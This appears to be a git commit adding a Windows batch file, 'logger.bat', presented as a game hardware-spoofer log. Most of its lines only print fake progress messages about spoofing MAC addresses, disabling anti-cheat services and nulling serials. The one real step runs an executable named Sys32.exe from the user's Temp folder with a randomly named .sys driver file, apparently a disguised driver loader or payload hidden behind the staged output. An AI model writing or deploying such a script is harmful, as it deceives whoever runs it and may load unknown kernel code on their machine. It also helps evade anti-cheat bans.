25b3b118a99cffd4f828dbac08eae69cf90ed322
ALTISDEV88 <hardustond12@gmail.com>
2025-01-06 13:06:51 -0800

    Add files via upload

---
+++ logger.bat
@@ -0,0 +1,43 @@
+@echo off
+title Temporary Spoofer Logs
+
+:Logs
+echo.[Debug] entered MacSpoofHandler
+timeout /t 1 > nul
+echo.[Debug] Spoofing Mac [1/5]
+timeout /t 1 > nul
+echo.[Debug] Spoofing Mac [2/5]
+timeout /t 3 > nul
+echo.[Debug] Spoofing Mac [3/5]
+timeout /t 2 > nul
+echo.[Debug] Spoofing Mac [4/5]
+timeout /t 1 > nul
+echo.[Debug] Mac spoofed.
+timeout /t 3 > nul
+echo.[Debug] Disabling anti-cheat services
+timeout /t 4 > nul
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Disabling anti-cheat services
+echo.[Debug] Finished preparing.
+timeout /t 1 > nul
+echo.[Debug] entered hardwareSpoofHandler
+timeout /t 1 > nul
+echo.[Debug] Checking if kernel driver is loaded
+timeout /t 5 > nul
+echo.[Debug] Kernel driver found.
+timeout /t 1 > nul
+echo.[Debug] Nulling Serials.
+cd C:\Users\%USERNAME%\AppData\Local\Temp
+Sys32.exe J98tgn34hfdh3.sys
+timeout /t 5 > nul
+
+
+
